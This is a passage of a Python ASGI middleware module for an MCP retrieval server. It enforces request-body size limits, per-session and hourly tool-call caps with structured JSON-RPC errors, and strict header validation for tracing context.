                            "Content-Length header is malformed (must be a "
                            "non-negative integer)"
                        ),
                    },
                )
                return
            if declared < 0:
                logger.warning(
                    "request rejected: negative content-length %d", declared,
                )
                await _send_json_error(
                    send,
                    status=400,
                    body={
                        "error": "malformed_content_length",
                        "message": (
                            f"Content-Length must be non-negative; got {declared}"
                        ),
                    },
                )
                return
            if declared > max_bytes:
                logger.warning(
                    "request rejected: content-length %d exceeds cap %d",
                    declared, max_bytes,
                )
                await _send_json_error(
                    send,
                    status=413,
                    body={
                        "error": "payload_too_large",
                        "message": (
                            f"request body declares {declared} bytes; the "
                            f"server caps inbound bodies at {max_bytes} "
                            f"bytes per request"
                        ),
                        "max_bytes": max_bytes,
                    },
                )
                return

        # For methods that semantically don't carry a body (GET/HEAD/
        # OPTIONS/DELETE/TRACE), pass through. The Content-Length cap
        # above already protects against a lying request that claims a
        # body via header.
        method = scope.get("method", "").upper()
        if method in _BODY_NOT_EXPECTED_METHODS:
            await self.app(scope, receive, send)
            return

        # F1 fix: eager pre-read. Drain ``receive`` BEFORE invoking
        # the inner app, count bytes, send 413 directly if over cap.
        # Replay buffered events to the inner app on success.
        buffered_events: list[dict] = []
        body_seen = 0
        while True:
            event = await receive()
            if event["type"] == "http.disconnect":
                # Client gave up before sending the full body. Pass
                # the disconnect through — the inner app will see it.
                buffered_events.append(event)
                break
            if event["type"] != "http.request":
                # Unknown event types pass through (defensive — the
                # ASGI spec only defines http.request and
                # http.disconnect on the receive side for HTTP scope).
                buffered_events.append(event)
                continue
            chunk = event.get("body", b"")
            body_seen += len(chunk)
            if body_seen > max_bytes:
                logger.warning(
                    "request rejected: body bytes exceeded cap %d (saw %d+)",
                    max_bytes, body_seen,
                )
                await _send_json_error(
                    send,
                    status=413,
                    body={
                        "error": "payload_too_large",
                        "message": (
                            f"request body exceeds the {max_bytes}-byte "
                            f"cap; the server caps inbound bodies to defend "
                            f"against memory-exhaustion requests"
                        ),
                        "max_bytes": max_bytes,
                    },
                )
                return
            buffered_events.append(event)
            if not event.get("more_body", False):
                # End of body — exit the drain loop.
                break

        # Replay buffered events through a synthetic receive. Once
        # exhausted, return http.disconnect (the standard ASGI
        # signal that no more body is coming).
        replay_iter = iter(buffered_events)

        async def replayed_receive() -> dict:
            try:
                return next(replay_iter)
            except StopIteration:
                return {"type": "http.disconnect"}

        await self.app(scope, replayed_receive, send)


# ---------------------------------------------------------------------------
# SessionCapMiddleware (E08_S04 — hard retrieval caps)
# ---------------------------------------------------------------------------


#: Path prefix for the FastMCP transport. The cap middleware is a
#: no-op on every other path (health, metrics, debug, future routes).
_MCP_PATH_PREFIX = "/mcp"

#: JSON-RPC method whose body we inspect for tool-name matching.
#: Other methods (``initialize``, ``ping``, ``tools/list``, ...) pass
#: through unchanged.
_MCP_TOOLS_CALL_METHOD = "tools/call"

#: F2 fix from the E08_S04 critique: strict format check on
#: ``mcp-session-id`` to narrow the spoofing attack surface. The
#: FastMCP ``StreamableHTTPSessionManager`` issues session ids via
#: ``uuid4().hex`` — a 32-char lowercase hex string. A spoofed
#: session id that does NOT match this pattern is rejected from
#: cap accounting; the cap behaves AS IF the header were absent
#: (skip cap, pass through; FastMCP itself will then reject the
#: malformed session-id with HTTP 404).
#:
#: An attacker can still rotate proper-looking UUID4 hex strings to
#: defeat the cap on the FIRST request per id (FastMCP would reject
#: subsequent requests with HTTP 404). The complete fix requires
#: coupling the cap middleware to the FastMCP session manager's
#: issued-id registry — out of scope for v1; tracked as a follow-up.
_VALID_SESSION_ID_RE: re.Pattern[str] = re.compile(r"^[0-9a-f]{32}$")


class SessionCapMiddleware:
    """Enforce per-session retrieval caps on ``tools/call`` invocations.

    E08_S04 Rule 2: max 3 ``search_papers`` and 4 ``get_chunk`` calls
    per ``Mcp-Session-Id``. When a cap is reached, the middleware
    short-circuits with a ``RETRIEVAL_CAP_REACHED`` structured error
    in the JSON-RPC response — the agent sees a tool-result-like
    payload it can parse and react to (proceed with already-retrieved
    chunks).

    **Where in the stack.** Mounted on the FastAPI app between
    ``OriginValidationMiddleware`` (must pass origin check before
    we waste time parsing the body) and ``BodySizeCapMiddleware``
    (so a cap-rejection response is itself capped). The cap is
    enforced on POST requests to ``/mcp`` whose JSON-RPC body has
    ``"method": "tools/call"`` AND whose ``params.name`` is one of
    the cap-tracked tools (per :data:`server.session.TOOLS_WITH_CAPS`).

    **Body buffering.** The middleware MUST read the JSON-RPC body
    BEFORE forwarding to the FastMCP app to inspect the method +
    tool name. This means we eager-buffer the request body (same
    pattern :class:`RequestBodySizeLimitMiddleware` uses for its
    F1 fix) and replay it through a synthetic ``receive`` callable
    on the pass-through path. The buffering cost is bounded by the
    upstream :class:`RequestBodySizeLimitMiddleware`'s 1 MB cap.

    **Missing session-id.** If ``mcp-session-id`` is absent from
    the request headers (which happens on the ``initialize`` call
    AND for stateless clients that don't carry the header on every
    request), the middleware skips cap enforcement and forwards
    unchanged. This matches the project's "cache is performance,
    not correctness" framing — a stateless client that bypasses the
    cap is by definition not in a runaway-loop scenario (no shared
    state to loop with).

    **Body parsing failures.** If the JSON-RPC body is malformed,
    not JSON, or doesn't have the expected shape, the middleware
    forwards unchanged so the FastMCP layer can return its own
    error. This middleware is purely additive — it never breaks a
    request that would otherwise succeed at the FastMCP layer.

    **Batched JSON-RPC.** If the body is a JSON array (batch call)
    rather than a single object, we conservatively pass through.
    FastMCP itself rejects batches per the MCP 2025-06-18 spec, so
    enforcing caps on batched calls would duplicate validation.

    **Failure-mode discipline.** Any internal exception (failed
    body decode, failed session lookup, etc.) is logged and
    forwarded through. The cap is a defensive ceiling — failing
    open is the right behavior (the worst case is one runaway loop;
    the best case is a request that legitimately should pass).
    """

    def __init__(self, app: Callable[..., Awaitable[None]]) -> None:
        self.app = app

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        # Only inspect POST /mcp (FastMCP's tools/call surface).
        method = scope.get("method", "").upper()
        path: str = scope.get("path", "")
        if method != "POST" or not (
            path == _MCP_PATH_PREFIX or path.startswith(_MCP_PATH_PREFIX + "/")
        ):
            await self.app(scope, receive, send)
            return

        # Extract mcp-session-id. If absent, skip cap enforcement.
        headers: list[tuple[bytes, bytes]] = scope.get("headers", [])
        session_id_b = _get_header(headers, b"mcp-session-id")
        if session_id_b is None:
            await self.app(scope, receive, send)
            return
        try:
            session_id = session_id_b.decode("ascii")
        except UnicodeDecodeError:
            # Malformed header — don't cap; FastMCP will reject if
            # the value is genuinely bad.
            await self.app(scope, receive, send)
            return

        # F2 fix from the E08_S04 critique: strict UUID4-hex format
        # check on the session-id. Spoofed session-ids that don't
        # match the FastMCP-issued format are excluded from cap
        # accounting — the request still forwards to FastMCP which
        # will reject the unknown session-id with HTTP 404. The cap
        # only applies to session-ids that PLAUSIBLY came from the
        # FastMCP session manager.
        if not _VALID_SESSION_ID_RE.match(session_id):
            logger.debug(
                "SessionCapMiddleware: session-id %r does not match "
                "the UUID4-hex format; skipping cap enforcement",
                session_id[:16],
            )
            await self.app(scope, receive, send)
            return

        # Buffer the request body so we can inspect it AND replay it
        # to the inner app. Same eager-pre-read shape as the
        # RequestBodySizeLimitMiddleware F1 fix.
        buffered_events: list[dict] = []
        body_bytes = bytearray()
        while True:
            event = await receive()
            if event["type"] == "http.disconnect":
                buffered_events.append(event)
                break
            if event["type"] != "http.request":
                buffered_events.append(event)
                continue
            chunk = event.get("body", b"")
            body_bytes.extend(chunk)
            buffered_events.append(event)
            if not event.get("more_body", False):
                break

        # Try to parse the JSON-RPC body. Failures fall through.
        tool_name: str | None = None
        request_id: Any = None
        cap_units = 1
        try:
            parsed = json.loads(body_bytes.decode("utf-8"))
            if isinstance(parsed, dict) and parsed.get("method") == _MCP_TOOLS_CALL_METHOD:
                request_id = parsed.get("id")
                params = parsed.get("params") or {}
                if isinstance(params, dict):
                    tool_name = params.get("name")
                    # agent-platform-t-batch-chunk-fetch (#83): a batched
                    # get_chunk consumes N per-tool cap units, not 1.
                    # This is the ONE place the cap layer reads a tool's
                    # arguments — deliberately narrow: only get_chunk,
                    # only chunk_id's length. An invalid shape (empty /
                    # over-max list) falls to the handler's own
                    # validation; here it just yields a units count that
                    # the wholesale cap check tolerates.
                    if tool_name == "get_chunk":
                        args = params.get("arguments")
                        cid = args.get("chunk_id") if isinstance(args, dict) else None
                        if isinstance(cid, list):
                            cap_units = len(cid)
        except (ValueError, UnicodeDecodeError):
            tool_name = None  # malformed body → forward unchanged

        # If the body is not a tools/call, replay without cap.
        # E13_S04 (Threat 4): the previous middleware short-circuited
        # here when ``tool_name not in TOOLS_WITH_CAPS`` — but the
        # hourly rate-limit cap applies to ALL tools, not just
        # search_papers / get_chunk. We MUST proceed to the hourly
        # check even for tools that are not per-tool tracked.
        if tool_name is None:
            await self._replay_to_app(scope, send, buffered_events)
            return

        # Look up / create the session and atomically check BOTH caps
        # (per-tool retrieval + hourly rate-limit) under one lock
        # acquisition. F1 rectification (E13_S04 adversary critique):
        # the previous implementation called per-tool and hourly
        # checks separately, which leaked per-tool budget when the
        # per-tool cap allowed (incremented counter) but the hourly
        # cap rejected. `check_both_caps` mutates neither counter
        # unless both pass — atomic two-cap commit.
        try:
            state = await get_or_create_session(session_id)
            verdict, count, limit = await check_both_caps(
                state, tool_name, n=cap_units
            )
        except Exception:  # noqa: BLE001
            # Failure-mode discipline: cap layer must not break the
            # request. Log + forward. If a cap is silently bypassed
            # in this path, the worst case is one runaway loop.
            logger.exception(
                "SessionCapMiddleware: cap check failed for "
                "session=%s tool=%s; forwarding without cap",
                session_id[:16], tool_name,
            )
            await self._replay_to_app(scope, send, buffered_events)
            return

        if verdict == "allowed":
            # Both caps passed — replay the request.
            await self._replay_to_app(scope, send, buffered_events)
            return

        if verdict == "hourly_rejected":
            # F1 + F6 rect (E13_S04 adversary critique): flatten the
            # rejection dispatch. RATE_LIMIT_EXCEEDED has a distinct
            # code from RETRIEVAL_CAP_REACHED so agents can tell which
            # cap fired; envelope shape is structurally identical.
            logger.info(
                "RATE_LIMIT_EXCEEDED: session=%s tool=%s attempted=%d limit=%d",
                session_id[:16], tool_name, count, limit,
            )
            try:
                from server.metrics import RETRIEVAL_CAP_REJECTIONS_COUNTER

                RETRIEVAL_CAP_REJECTIONS_COUNTER.labels(
                    tool="rate_limit_hourly"
                ).inc()
            except Exception:  # noqa: BLE001
                logger.debug("metrics inc failed", exc_info=True)
            await self._send_rate_limit_response(
                send, request_id, tool_name, count, limit
            )
            return

        # verdict == "per_tool_rejected" — fall through to the
        # existing RETRIEVAL_CAP_REACHED short-circuit below.

        # OVER cap — short-circuit with a structured RETRIEVAL_CAP_REACHED
        # JSON-RPC response. The agent sees this as a regular tool
        # result with isError=True and structuredContent carrying the
        # cap details, so it can react (proceed with the chunks
        # already retrieved).
        logger.info(
            "RETRIEVAL_CAP_REACHED: session=%s tool=%s attempted=%d limit=%d",
            session_id[:16], tool_name, count, limit,
        )
        # F9 fix from the E08_S04 critique: surface the rejection as
        # a Prometheus counter so operators can see how often caps
        # fire. The cap middleware short-circuits BEFORE FastMCP, so
        # any FastMCP-side per-tool counter would NOT see this event.
        try:
            from server.metrics import RETRIEVAL_CAP_REJECTIONS_COUNTER

            RETRIEVAL_CAP_REJECTIONS_COUNTER.labels(tool=tool_name).inc()
        except Exception:  # noqa: BLE001
            logger.debug("metrics inc failed", exc_info=True)
        cap_payload = _retrieval_cap_payload(tool_name, count, limit)
        rpc_response = {
            "jsonrpc": "2.0",
            "id": request_id,
            "result": {
                "content": [
                    {
                        "type": "text",
                        "text": json.dumps(cap_payload, sort_keys=True),
                    }
                ],
                "structuredContent": cap_payload,
                "isError": True,
            },
        }
        body_out = json.dumps(rpc_response, sort_keys=True).encode("utf-8")
        await send(
            {
                "type": "http.response.start",
                "status": 200,
                "headers": [
                    (b"content-type", b"application/json"),
                    (b"content-length", str(len(body_out)).encode("ascii")),
                ],
            }
        )
        await send(
            {
                "type": "http.response.body",
                "body": body_out,
                "more_body": False,
            }
        )

    async def _replay_to_app(
        self,
        scope: dict,
        send: Callable[..., Awaitable[None]],
        buffered_events: list[dict],
    ) -> None:
        """Forward the buffered request body to the inner app via a
        synthetic receive callable. Same replay shape as
        :class:`RequestBodySizeLimitMiddleware`'s F1 fix."""
        replay_iter = iter(buffered_events)

        async def replayed_receive() -> dict:
            try:
                return next(replay_iter)
            except StopIteration:
                return {"type": "http.disconnect"}

        await self.app(scope, replayed_receive, send)

    async def _send_rate_limit_response(
        self,
        send: Callable[..., Awaitable[None]],
        request_id: Any,
        tool_name: str,
        attempted: int,
        limit: int,
    ) -> None:
        """Short-circuit the request with a structured
        RATE_LIMIT_EXCEEDED JSON-RPC response (E13_S04 Threat 4).

        Mirrors the RETRIEVAL_CAP_REACHED shape so consuming agents
        see a uniform error envelope: ``isError=True`` +
        ``structuredContent`` carrying ``code`` and ``message``. The
        distinct code (``RATE_LIMIT_EXCEEDED`` vs
        ``RETRIEVAL_CAP_REACHED``) lets the agent tell which cap fired.
        """
        payload = _rate_limit_payload(tool_name, attempted, limit)
        rpc_response = {
            "jsonrpc": "2.0",
            "id": request_id,
            "result": {
                "content": [
                    {
                        "type": "text",
                        "text": json.dumps(payload, sort_keys=True),
                    }
                ],
                "structuredContent": payload,
                "isError": True,
            },
        }
        body_out = json.dumps(rpc_response, sort_keys=True).encode("utf-8")
        await send(
            {
                "type": "http.response.start",
                "status": 200,
                "headers": [
                    (b"content-type", b"application/json"),
                    (b"content-length", str(len(body_out)).encode("ascii")),
                ],
            }
        )
        await send(
            {
                "type": "http.response.body",
                "body": body_out,
                "more_body": False,
            }
        )


def _retrieval_cap_payload(tool_name: str, attempted: int, limit: int) -> dict[str, Any]:
    """Build the structured payload for a RETRIEVAL_CAP_REACHED
    response. Shared so the wire shape is single-source-of-truth."""
    return {
        "code": "RETRIEVAL_CAP_REACHED",
        "message": (
            f"{tool_name} cap of {limit} call(s) per MCP session reached "
            f"(attempt #{attempted}). Proceed with the chunks already "
            f"retrieved or open a new session."
        ),
        "tool": tool_name,
        "limit": limit,
        "session_attempted_count": attempted,
    }


def _rate_limit_payload(tool_name: str, attempted: int, limit: int) -> dict[str, Any]:
    """Build the structured payload for a RATE_LIMIT_EXCEEDED response
    (E13_S04 Threat 4). Mirrors the RETRIEVAL_CAP_REACHED shape so
    consuming agents can parse both with the same handler; the
    distinct ``code`` value lets the agent tell which cap fired.
    """
    return {
        "code": "RATE_LIMIT_EXCEEDED",
        "message": (
            f"hourly rate limit of {limit} tool calls per MCP session "
            f"reached (attempt #{attempted} in the rolling 1-hour window, "
            f"any tool). Back off and retry after the window expires, "
            f"or open a new session."
        ),
        "tool": tool_name,
        "limit": limit,
        "window_seconds": 3600,
        "session_attempted_count": attempted,
    }


# =============================================================================
# TracingContextMiddleware (E14_S02 — populate per-request OTel ContextVars)
# =============================================================================


class TracingContextMiddleware:
    """Pure-ASGI middleware that copies ``Mcp-Session-Id`` and
    ``Arxmcp-Agent-Role`` request headers into
    :data:`server.observability.tracing.current_session_id` and
    :data:`server.observability.tracing.current_agent_role`
    ContextVars for the duration of the inner-app call.

    Also resets :data:`server.observability.tracing.current_cache_layer`
    to ``"miss"`` per request so the parent span starts from a known
    default; handlers update it via
    :func:`server.observability.tracing.set_cache_layer` on a hit.

    **Why a ContextVar over a FastMCP ``Context`` parameter:** Today
    no handler signature takes a ``Context`` arg and threading one
    through would touch all 7 handlers + risk a TOOL_SCHEMA_VERSION
    bump if FastMCP exposes it on the wire. A ContextVar is single-
    chokepoint, asyncio-safe (Python's stdlib ``contextvars`` is
    propagated across ``await`` boundaries), and the same pattern
    OTel itself uses for context propagation. See E14_S02 synthesis
    D3.

    **Pure-ASGI required.** ``starlette.middleware.base.BaseHTTPMiddleware``
    is project-banned (E06_S01 F1) because it silently no-ops
    response interception on SSE paths. The class follows the
    pattern of :class:`BodySizeCapMiddleware` /
    :class:`SessionCapMiddleware`.
    """

    def __init__(self, app: Callable[..., Awaitable[None]]) -> None:
        self.app = app

    async def __call__(
        self, scope: dict, receive: Callable, send: Callable
    ) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        # F13 rectification: ContextVars are cheap imports — hoisting
        # them to function scope (rather than the prior __call__-time
        # lazy import) saves a per-request `sys.modules` lookup
        # without pulling the heavy OTel SDK at module-load. The OTLP
        # exporter (the actually-heavy import) remains lazy inside
        # setup_tracing.
        from server.observability.tracing import (  # noqa: PLC0415
            MAX_HEADER_BYTES,
            VALID_AGENT_ROLES,
            current_agent_role,
            current_cache_layer,
            current_session_id,
        )

        headers = scope.get("headers", [])
        session_id_b = _get_header(headers, b"mcp-session-id")
        agent_role_b = _get_header(headers, b"arxmcp-agent-role")

        # F14 rectification: strict ASCII decode + None on failure.
        # The prior ``errors="replace"`` silently minted U+FFFD into
        # the span attribute when an attacker set non-ASCII bytes.
        session_id = _decode_header_strict(session_id_b)

        # F2 rectification: validate Arxmcp-Agent-Role against the
        # canonical allow-list AND enforce a length cap. Unknown /
        # oversized values fall back to None (no span attribute),
        # closing the cardinality + log-injection vector.
        agent_role_raw = _decode_header_strict(agent_role_b)
        agent_role: str | None
        if agent_role_raw is None:
            agent_role = None
        elif (
            len(agent_role_raw.encode("utf-8")) > MAX_HEADER_BYTES
            or agent_role_raw not in VALID_AGENT_ROLES
        ):
            logger.debug(
                "TracingContextMiddleware: rejected Arxmcp-Agent-Role "
                "value (header_len=%d, allowed=%s); dropping.",
                len(agent_role_raw),
                sorted(VALID_AGENT_ROLES),
            )
            agent_role = None
        else:
            agent_role = agent_role_raw

        sid_token = current_session_id.set(session_id)
        role_token = current_agent_role.set(agent_role)
        cache_token = current_cache_layer.set("miss")
        try:
            await self.app(scope, receive, send)
        finally:
            current_session_id.reset(sid_token)
            current_agent_role.reset(role_token)
            current_cache_layer.reset(cache_token)


def _decode_header_strict(value: bytes | None) -> str | None:
    """Decode a request header value as strict ASCII. Returns
    ``None`` on absence or invalid bytes (F14 rectification — the
    prior ``errors="replace"`` silently minted U+FFFD into trace
    attributes when an attacker injected non-ASCII bytes)."""
    if value is None:
        return None
    try:
        return value.decode("ascii")
    except UnicodeDecodeError:
        return None


__all__ = [
    "LOOPBACK_HOST_HEADER_HOSTS",
    "LOOPBACK_ORIGIN_HOSTS",
    "LOOPBACK_ORIGIN_SCHEMES",
    "MAX_ECHOED_ORIGIN_LEN",
    "REQUEST_BODY_MAX_BYTES",
    "HostValidationMiddleware",
    "OriginValidationMiddleware",
    "RequestBodySizeLimitMiddleware",
    "SecFetchSiteMiddleware",
    "SecurityHeadersMiddleware",
    "SessionCapMiddleware",
    "TracingContextMiddleware",
]
